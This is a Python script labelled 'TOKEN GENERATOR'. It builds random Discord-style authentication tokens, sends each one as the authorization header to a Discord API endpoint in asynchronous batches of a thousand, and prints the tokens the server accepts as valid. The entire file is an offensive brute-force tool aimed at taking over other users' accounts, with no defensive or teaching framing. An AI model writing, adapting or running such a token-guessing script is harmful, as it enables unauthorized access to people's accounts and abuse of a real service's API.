import base64
from random import randint, choices

import time
import asyncio
import aiohttp
import string

from art import tprint
from colorama import Fore
from plyer import notification

tprint(f"TOKEN GENERATOR", font='modular')

def gen_first():
    sample_string = str(randint(000000000000000000, 999999999999999999))
    encodedBytes = base64.b64encode(sample_string.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    return encodedid
def gen_second():
    return ''.join(choices("XY")+choices(string.ascii_letters + string.digits + "-_", k=5))
def gen_third():
    return ''.join(choices(string.ascii_letters + string.digits + "-_", k=27))

def notify(title, message):
	notification.notify(title = title, message = message,  app_icon="./nitro.ico")

url = "https://discordapp.com/api/v6/users/@me/library"

async def check(token, session):
    async with session.get(url, headers={'Content-Type': 'application/json', 'authorization': token}) as res:
        if res.status != 200:
            # return f"{token} : INVALID"
            pass
        elif res.status == 200:
            return f"{token} : VALID"

async def main():
    async with aiohttp.ClientSession() as session:
        for i in range(10):
            tasks = []
            for j in range(1000):
                token = f"{gen_first()}.{gen_second()}.{gen_third()}"
                tasks.append(asyncio.ensure_future(check(token, session)))
            tokens = set(await asyncio.gather(*tasks))
            if len(tokens) == 1:
                print("В пачке нет действительных токенов.")
            else:
                for token in tokens:
                    print(token)
        
if __name__ == "__main__":
    start_time = time.time()
    asyncio.get_event_loop().run_until_complete(main())
    print("--- %s seconds ---" % (time.time() - start_time))
    # asyncio.get_event_loop().close()